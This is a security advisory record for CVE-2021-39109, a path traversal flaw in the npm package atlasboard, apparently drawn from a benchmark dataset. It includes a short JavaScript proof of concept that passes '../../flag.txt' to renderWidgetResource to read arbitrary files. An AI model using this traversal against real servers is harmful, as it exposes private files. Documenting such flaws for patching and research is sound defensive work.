# [H] Path traversal in atlasboard

## Summary
Severity: High
Advisory: GHSA-25pr-6pr6-68v7
CVE: CVE-2021-39109
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2021-09-02
Source: https://github.com/advisories/GHSA-25pr-6pr6-68v7
Type: github-advisory

## Affected
- npm: `atlasboard` — affected >=0 <1.1.9

## Details
The renderWidgetResource resource in Atlasian Atlasboard before version 1.1.9 allows remote attackers to read arbitrary files via a path traversal vulnerability.

### PoC
```javascript
const widget = require(\"atlasboard/lib/webapp/routes/widget\");

// Mock req and res
const req = {};
const res = {
  sendFile: (filePath) => {
    // Read and return file contents synchronously
    const data = fs.readFileSync(filePath, \"utf8\");
    console.log(\"Contents of /flag.txt:\");
    console.log(data);
  },
  status: function (code) {
    this.statusCode = code;
    return this;
  },
  send: function (msg) {
    throw new Error(`Server responded with status ${this.statusCode}: ${msg}`);
  },
};

// localPackagesPath set to root to allow traversal to /flag.txt
const localPackagesPath = \"/\";

// resource string with path traversal to escape localPackagesPath and widgets directory
const resource = \"../../flag.txt\";

// Call vulnerable function
await widget.renderWidgetResource(localPackagesPath, resource, req, res);
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2021-39109
- https://arxiv.org/abs/2506.04962
- https://arxiv.org/pdf/2506.04962
- https://bitbucket.org/atlassian/atlasboard/commits/9c03df09f09399e2601010466e8ba3a28236eb9c
- https://bitbucket.org/atlassian/atlasboard/pull-requests/91/buildeng-19379-apply-only-the-path
- https://bitbucket.org/atlassian/atlasboard/src/master
